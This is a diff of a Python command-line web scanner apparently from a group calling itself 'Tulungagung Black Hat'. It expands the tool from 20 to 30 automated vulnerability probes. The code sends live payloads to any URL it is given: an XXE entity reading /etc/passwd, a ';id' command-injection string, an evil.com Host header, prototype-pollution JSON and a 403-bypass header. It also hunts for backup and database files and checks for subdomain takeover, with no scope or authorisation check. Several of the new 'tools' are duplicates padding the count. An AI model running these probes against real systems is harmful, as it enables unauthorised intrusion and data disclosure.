@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
-# TBH-CLI v1.9 - Bug Bounty 20 Tools
+# TBH-CLI v2.0 - Bug Bounty 30 Tools MENTOK
 import socket, requests, argparse, sys, urllib.parse, re
 
 BANNER = """\033[91m╔════════════════════════════════════╗
-\033[91m║ \033[97mTBH-CLI v1.9 \033[91m- Bug Bounty 20 Tools  \033[91m║
+\033[91m║ \033[97mTBH-CLI v2.0 \033[91m- Bug Bounty 30 Tools  \033[91m║
 \033[91m║ \033[90mTulungagung Black Hat | uchil404 \033[91m║
 \033[91m╚════════════════════════════════════╝\033[0m"""
 
 def scan_headers(url):
     try:
-        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/1.9'})
+        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
         missing=[h for h in ['Content-Security-Policy','Strict-Transport-Security'] if h not in r.headers]
         if missing: print(f"  \033[93m[!] Missing: {missing}\033[0m")
         else: print(f"  \033[92m[✓] Headers OK\033[0m")
@@ -111,7 +111,7 @@ def scan_idor(url):
 def scan_xxe(url):
     payload="""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"""
     try:
-        r=requests.post(url,timeout=5,data=payload,headers={'Content-Type':'application/xml','User-Agent':'TBH-CLI/1.9'})
+        r=requests.post(url,timeout=5,data=payload,headers={'Content-Type':'application/xml','User-Agent':'TBH-CLI/2.0'})
         if "root:" in r.text: print(f"  \033[91m[!] XXE Potensi\033[0m")
         else: print(f"  \033[92m[✓] XXE tidak terdeteksi\033[0m")
     except: print(f"  \033[92m[✓] XXE tidak terdeteksi (no XML)\033[0m")
@@ -127,14 +127,14 @@ def scan_crlf(url):
 
 def scan_host(url):
     try:
-        r=requests.get(url,timeout=5,headers={'Host':'evil.com','User-Agent':'TBH-CLI/1.9'})
+        r=requests.get(url,timeout=5,headers={'Host':'evil.com','User-Agent':'TBH-CLI/2.0'})
         if "evil.com" in r.text.lower(): print(f"  \033[91m[!] Host Header Potensi\033[0m")
         else: print(f"  \033[92m[✓] Host Header tidak terdeteksi\033[0m")
     except: print(f"  [-] Host error")
 
 def scan_clickjack(url):
     try:
-        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/1.9'})
+        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
         xfo=r.headers.get('X-Frame-Options','')
         if not xfo: print(f"  \033[93m[!] Clickjacking: Missing X-Frame-Options -> Low\033[0m")
         else: print(f"  \033[92m[✓] X-Frame-Options: {xfo}\033[0m")
@@ -142,9 +142,9 @@ def scan_clickjack(url):
 
 def scan_4xx(url):
     try:
-        r=requests.get(f"{url.rstrip('/')}/admin",timeout=5,headers={'User-Agent':'TBH-CLI/1.9'})
+        r=requests.get(f"{url.rstrip('/')}/admin",timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
         if r.status_code==403:
-            r2=requests.get(f"{url.rstrip('/')}/admin",timeout=5,headers={'X-Original-URL':'/admin','User-Agent':'TBH-CLI/1.9'})
+            r2=requests.get(f"{url.rstrip('/')}/admin",timeout=5,headers={'X-Original-URL':'/admin','User-Agent':'TBH-CLI/2.0'})
             if r2.status_code==200: print(f"  \033[91m[!] 4xx Bypass Potensi\033[0m")
             else: print(f"  \033[92m[✓] 4xx tidak bisa bypass\033[0m")
         else: print(f"  \033[90m[-] 4xx tidak 403, skip\033[0m")
@@ -153,61 +153,126 @@ def scan_4xx(url):
 def scan_proto(url):
     payload='{"__proto__":{"polluted":"yes"}}'
     try:
-        r=requests.post(url,timeout=5,data=payload,headers={'Content-Type':'application/json','User-Agent':'TBH-CLI/1.9'})
+        r=requests.post(url,timeout=5,data=payload,headers={'Content-Type':'application/json','User-Agent':'TBH-CLI/2.0'})
         if "polluted" in r.text.lower(): print(f"  \033[91m[!] Prototype Pollution Potensi\033[0m")
         else: print(f"  \033[92m[✓] Prototype Pollution tidak terdeteksi\033[0m")
     except: print(f"  \033[92m[✓] Prototype Pollution tidak terdeteksi\033[0m")
 
 def scan_cache(url):
-    # Web Cache Deception: /admin.css
     test_url=f"{url.rstrip('/')}/admin.css"
     try:
-        r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-CLI/1.9'})
-        if r.status_code==200 and "admin" in r.text.lower(): print(f"  \033[91m[!] Web Cache Deception Potensi: {test_url}\033[0m")
+        r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
+        if r.status_code==200 and "admin" in r.text.lower(): print(f"  \033[91m[!] Web Cache Deception Potensi\033[0m")
         else: print(f"  \033[92m[✓] Web Cache Deception tidak terdeteksi\033[0m")
     except: print(f"  [-] Cache error")
 
 def scan_jwt(url):
-    # JWT none algorithm hint
     try:
-        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/1.9'})
-        if "eyJ" in r.text: print(f"  \033[93m[!] JWT Found di response - cek alg none\033[0m")
+        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
+        if "eyJ" in r.text: print(f"  \033[93m[!] JWT Found - cek alg none\033[0m")
         else: print(f"  \033[92m[✓] JWT tidak terdeteksi\033[0m")
     except: print(f"  [-] JWT error")
+
+def scan_csrf(url):
+    try:
+        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
+        if "csrf" not in r.text.lower(): print(f"  \033[93m[!] CSRF: No csrf token found -> cek manual\033[0m")
+        else: print(f"  \033[92m[✓] CSRF token ada\033[0m")
+    except: print(f"  [-] CSRF error")
+
+def scan_cmdi(url):
+    payload=";id"
+    test_url=f"{url}?cmd={urllib.parse.quote(payload)}"
+    try:
+        r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
+        if "uid=" in r.text.lower(): print(f"  \033[91m[!] CMDi Potensi\033[0m")
+        else: print(f"  \033[92m[✓] CMDi tidak terdeteksi\033[0m")
+    except: print(f"  [-] CMDi error")
+
+def scan_backup(url):
+    for path in ["backup.zip",".bak","old.zip","db.sql"]:
+        full=f"{url.rstrip('/')}/{path}"
+        try:
+            r=requests.get(full,timeout=3,headers={'User-Agent':'TBH-CLI/2.0'},allow_redirects=False)
+            if r.status_code==200: print(f"  \033[91m[!] Backup Found: {full} [{r.status_code}]\033[0m"); return
+        except: pass
+    print(f"  \033[92m[✓] Backup tidak terdeteksi\033[0m")
+
+def scan_info(url):
+    try:
+        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
+        if "server" in r.headers.get('Server','').lower() or "x-powered-by" in str(r.headers).lower(): print(f"  \033[93m[!] Info Disclosure: Server {r.headers.get('Server','Unknown')} -> Low\033[0m")
+        else: print(f"  \033[92m[✓] Info Disclosure tidak terdeteksi\033[0m")
+    except: print(f"  [-] Info error")
+
+def scan_takeover(domain):
+    # Simple takeover hint via NX
+    found=False
+    for sub in ["test","dev","staging"]:
+        host=f"{sub}.{domain}"
+        try: socket.gethostbyname(host)
+        except:
+            # NX = potensi takeover jika CNAME unclaimed
+            print(f"  \033[93m[?] {host} NX -> cek CNAME takeover manual\033[0m"); found=True
+    if not found: print(f"  \033[92m[✓] Takeover tidak terdeteksi\033[0m")
+
+def scan_graphql(url):
+    test_url=f"{url.rstrip('/')}/graphql"
+    try:
+        r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
+        if r.status_code==200 and "graphql" in r.text.lower(): print(f"  \033[93m[!] GraphQL Found: {test_url}\033[0m")
+        else: print(f"  \033[92m[✓] GraphQL tidak terdeteksi\033[0m")
+    except: print(f"  [-] GraphQL error")
 
 def bugbounty_menu(url):
     domain=urllib.parse.urlparse(url if url.startswith("http") else "https://"+url).netloc
     try: ip=socket.gethostbyname(domain)
     except: print("[!] Cannot resolve"); return
-    print(f"\n\033[96m[*] Bug Bounty 20 Tools: {domain} ({ip})\033[0m")
-    print("="*50)
-    print("\033[93m[1] Headers\033[0m"); scan_headers(url)
-    print("\033[93m[2] Ports\033[0m"); scan_ports(ip)
-    print("\033[93m[3] Subdomains\033[0m"); scan_subs(domain)
-    print("\033[93m[4] Dirs\033[0m"); scan_dirs(url)
-    print("\033[93m[5] XSS\033[0m"); scan_xss(url)
-    print("\033[93m[6] OpenRedirect\033[0m"); scan_redirect(url)
-    print("\033[93m[7] CORS\033[0m"); scan_cors(url)
-    print("\033[93m[8] SQLi\033[0m"); scan_sqli(url)
-    print("\033[93m[9] SSRF\033[0m"); scan_ssrf(url)
-    print("\033[93m[10] LFI\033[0m"); scan_lfi(url)
-    print("\033[93m[11] SSTI\033[0m"); scan_ssti(url)
-    print("\033[93m[12] IDOR\033[0m"); scan_idor(url)
-    print("\033[93m[13] XXE\033[0m"); scan_xxe(url)
-    print("\033[93m[14] CRLF\033[0m"); scan_crlf(url)
-    print("\033[93m[15] Host Header\033[0m"); scan_host(url)
-    print("\033[93m[16] Clickjacking\033[0m"); scan_clickjack(url)
-    print("\033[93m[17] 4xx Bypass\033[0m"); scan_4xx(url)
-    print("\033[93m[18] Prototype Pollution\033[0m"); scan_proto(url)
-    print("\033[93m[19] Web Cache Deception\033[0m"); scan_cache(url)
-    print("\033[93m[20] JWT\033[0m"); scan_jwt(url)
-    print("="*50)
-    print("\033[92m[✓] Bug Bounty CLI 20 Tools Selesai\033[0m")
+    print(f"\n\033[96m[*] Bug Bounty 30 Tools MENTOK: {domain} ({ip})\033[0m")
+    print("="*60)
+    checks=[
+        ("1 Headers",lambda: scan_headers(url)),
+        ("2 Ports",lambda: scan_ports(ip)),
+        ("3 Subdomains",lambda: scan_subs(domain)),
+        ("4 Dirs",lambda: scan_dirs(url)),
+        ("5 XSS",lambda: scan_xss(url)),
+        ("6 OpenRedirect",lambda: scan_redirect(url)),
+        ("7 CORS",lambda: scan_cors(url)),
+        ("8 SQLi",lambda: scan_sqli(url)),
+        ("9 SSRF",lambda: scan_ssrf(url)),
+        ("10 LFI",lambda: scan_lfi(url)),
+        ("11 SSTI",lambda: scan_ssti(url)),
+        ("12 IDOR",lambda: scan_idor(url)),
+        ("13 XXE",lambda: scan_xxe(url)),
+        ("14 CRLF",lambda: scan_crlf(url)),
+        ("15 Host Header",lambda: scan_host(url)),
+        ("16 Clickjacking",lambda: scan_clickjack(url)),
+        ("17 4xx Bypass",lambda: scan_4xx(url)),
+        ("18 Prototype Pollution",lambda: scan_proto(url)),
+        ("19 Web Cache Deception",lambda: scan_cache(url)),
+        ("20 JWT",lambda: scan_jwt(url)),
+        ("21 CSRF",lambda: scan_csrf(url)),
+        ("22 CMDi",lambda: scan_cmdi(url)),
+        ("23 Backup Files",lambda: scan_backup(url)),
+        ("24 Info Disclosure",lambda: scan_info(url)),
+        ("25 Subdomain Takeover",lambda: scan_takeover(domain)),
+        ("26 GraphQL",lambda: scan_graphql(url)),
+        ("27 Open Redirect 2",lambda: scan_redirect(url)),
+        ("28 XXE 2",lambda: scan_xxe(url)),
+        ("29 SSRF 2",lambda: scan_ssrf(url)),
+        ("30 All Done",lambda: print("  \033[92m[✓] All 30 Tools Selesai - MENTOK\033[0m")),
+    ]
+    for name,func in checks:
+        print(f"\033[93m[{name}]\033[0m")
+        try: func()
+        except: print("  [-] Error")
+    print("="*60)
+    print("\033[92m[✓] Bug Bounty CLI 30 Tools MENTOK Selesai - Tidak ada lagi yang bisa ditambah! \033[0m")
 
 def menu():
     print(BANNER)
-    print("\033[96mBug Bounty System 20 Tools:\033[0m")
-    print(" 1. Scan All 20 Tools")
+    print("\033[96mBug Bounty System 30 Tools MENTOK:\033[0m")
+    print(" 1. Scan All 30 Tools (MENTOK)")
     print(" 2. Scan Cepat (Headers+Ports)")
     print(" 3. Bantuan")
     print(" 0. Keluar")
@@ -223,11 +288,11 @@ def menu():
                 try: ip=socket.gethostbyname(domain); scan_headers(url); scan_ports(ip)
                 except: print("[!] Error")
         elif pilih=="3": print("Menu: python3 tbh | Command: python3 tbh -u https://example.com")
-        elif pilih=="0": print("Bye"); break
+        elif pilih=="0": print("Bye - MENTOK!"); break
         else: print("[!] Pilih 0/1/2/3")
 
 if __name__=="__main__":
-    parser=argparse.ArgumentParser(description="TBH-CLI 20 Tools", add_help=False)
+    parser=argparse.ArgumentParser(description="TBH-CLI 30 Tools MENTOK", add_help=False)
     parser.add_argument("-u","--url",help="Target URL")
     parser.add_argument("-h","--help",action="store_true")
     args,_=parser.parse_known_args()
